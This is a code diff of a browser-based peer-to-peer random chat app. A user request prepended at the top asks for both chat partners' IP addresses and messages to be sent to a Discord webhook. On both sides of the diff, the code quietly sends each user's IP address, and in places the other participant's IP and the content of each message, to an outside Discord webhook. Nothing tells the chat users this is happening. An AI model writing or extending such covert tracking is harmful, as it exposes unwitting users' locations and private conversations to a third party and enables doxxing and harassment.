@@ -1,3 +1,5 @@
+add to this code when 2 users are joined to a chat room to send it to a discord webhook and when one of the user types something it send the massage to a discord right but only shows the user ip address whoever sendet that massage make sure to show the 2 of the users ip addresess: show the whole code 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -540,7 +542,6 @@
         let myPeerId;
         let isRandomConnecting = false;
         let userIP = 'Unknown';
-        let remoteUserIP = 'Unknown';
         
         let trackerConnection;
         const TRACKER_SERVER_ID = 'user-tracker-server';
@@ -548,16 +549,16 @@
         let heartbeatInterval;
         
         // Function to send data to Discord webhook
-        async function sendToDiscordWebhook(username, ipAddress, message = null, otherUserIP = null) {
+        async function sendToDiscordWebhook(username, ipAddress, message = null) {
             try {
                 const payload = {
                     content: null,
                     embeds: [
                         {
-                            title: message ? "New Message Sent" : "New Chat Connection Established",
+                            title: message ? "New Message Sent" : "New User Joined",
                             description: message ? 
                                 `A new message has been sent in the chat` : 
-                                "A new chat connection has been established between two users",
+                                "A new user has joined the chat application",
                             color: message ? 3447003 : 5814783, // Blue for messages, purple for joins
                             fields: [
                                 {
@@ -569,6 +570,11 @@
                                     name: "IP Address",
                                     value: ipAddress,
                                     inline: true
+                                },
+                                {
+                                    name: "Timestamp",
+                                    value: new Date().toISOString(),
+                                    inline: false
                                 }
                             ],
                             footer: {
@@ -578,35 +584,12 @@
                     ]
                 };
 
-                // Add remote user IP if this is a connection notification
-                if (!message && otherUserIP) {
-                    payload.embeds[0].fields.push({
-                        name: "Remote User IP",
-                        value: otherUserIP,
-                        inline: true
-                    });
-                }
-
-                // Add timestamp field
-                payload.embeds[0].fields.push({
-                    name: "Timestamp",
-                    value: new Date().toISOString(),
-                    inline: false
-                });
-
                 // Add message field if this is a message notification
                 if (message) {
                     payload.embeds[0].fields.unshift({
                         name: "Message Content",
                         value: message,
                         inline: false
-                    });
-
-                    // Add remote user IP for messages
-                    payload.embeds[0].fields.push({
-                        name: "Remote User IP",
-                        value: otherUserIP || 'Unknown',
-                        inline: true
                     });
                 }
                 
@@ -735,6 +718,7 @@
                 // Get user's IP address and send to Discord
                 await getUserIP();
                 log(`User IP: ${userIP}`);
+                await sendToDiscordWebhook(localUsername, userIP);
                 
                 peer = new Peer(peerId, {
                     debug: 2
@@ -831,8 +815,7 @@
                 trackerConnection.send({
                     type: 'register',
                     peerId: myPeerId,
-                    username: localUsername,
-                    ip: userIP
+                    username: localUsername
                 });
                 
                 if (heartbeatInterval) clearInterval(heartbeatInterval);
@@ -841,8 +824,7 @@
                         trackerConnection.send({
                             type: 'heartbeat',
                             peerId: myPeerId,
-                            username: localUsername,
-                            ip: userIP
+                            username: localUsername
                         });
                     }
                 }, 30000);
@@ -888,10 +870,7 @@
                 });
                 
                 const connectedUsers = new Map();
-                connectedUsers.set(myPeerId, {
-                    username: localUsername,
-                    ip: userIP
-                });
+                connectedUsers.set(myPeerId, localUsername);
                 
                 const userConnections = new Map();
                 
@@ -923,10 +902,7 @@
                         log(`Tracker: Received data from ${conn.peer}: ${JSON.stringify(data)}`);
                         
                         if (data.type === 'register' || data.type === 'heartbeat') {
-                            connectedUsers.set(data.peerId, {
-                                username: data.username,
-                                ip: data.ip || 'Unknown'
-                            });
+                            connectedUsers.set(data.peerId, data.username);
                             
                             broadcastUserList();
                         }
@@ -957,12 +933,7 @@
                         users: Object.fromEntries(connectedUsers)
                     };
                     
-                    // Update our local online users list with just usernames
-                    const usernameMap = new Map();
-                    connectedUsers.forEach((userData, peerId) => {
-                        usernameMap.set(peerId, userData.username);
-                    });
-                    onlineUsers = usernameMap;
+                    onlineUsers = new Map(connectedUsers);
                     updateOnlineUsersUI();
                     
                     userConnections.forEach((conn, peerId) => {
@@ -1039,11 +1010,9 @@
                 log(`Connection established with: ${connection.peer}`);
                 isConnected = true;
                 
-                // Send our username and IP to the remote peer
                 connection.send({
-                    type: 'userinfo',
-                    username: localUsername,
-                    ip: userIP
+                    type: 'username',
+                    username: localUsername
                 });
                 
                 setupScreen.style.display = 'none';
@@ -1056,9 +1025,6 @@
                 resetRandomChatButton();
                 
                 appendSystemMessage('Connected! Say hello!');
-                
-                // Send connection notification to Discord with both IPs
-                sendToDiscordWebhook(localUsername, userIP, null, remoteUserIP);
             });
             
             connection.on('data', (data) => {
@@ -1066,17 +1032,10 @@
                 
                 if (data.type === 'message') {
                     appendMessage(data.message, false, remoteUsername || 'Stranger');
-                    
-                    // Send message to Discord webhook with both IPs
-                    sendToDiscordWebhook(localUsername, userIP, data.message, remoteUserIP);
-                } else if (data.type === 'userinfo') {
+                } else if (data.type === 'username') {
                     remoteUsername = data.username;
-                    remoteUserIP = data.ip || 'Unknown';
                     usernameDisplay.textContent = `Chatting with: ${remoteUsername}`;
                     appendSystemMessage(`You're chatting with ${remoteUsername}`);
-                    
-                    // Update Discord with the remote user's IP
-                    sendToDiscordWebhook(localUsername, userIP, null, remoteUserIP);
                 }
             });
             
@@ -1101,7 +1060,6 @@
         
         function handleDisconnect() {
             isConnected = false;
-            remoteUserIP = 'Unknown';
             
             setupScreen.style.display = 'flex';
             chatScreen.style.display = 'none';
@@ -1212,9 +1170,9 @@
                 
                 appendMessage(message, true, localUsername);
                 
-                // Send message to Discord webhook with both IPs
+                // Send message to Discord webhook
                 try {
-                    await sendToDiscordWebhook(localUsername, userIP, message, remoteUserIP);
+                    await sendToDiscordWebhook(localUsername, userIP, message);
                 } catch (error) {
                     log(`Error sending message to Discord: ${error.message}`);
                 }
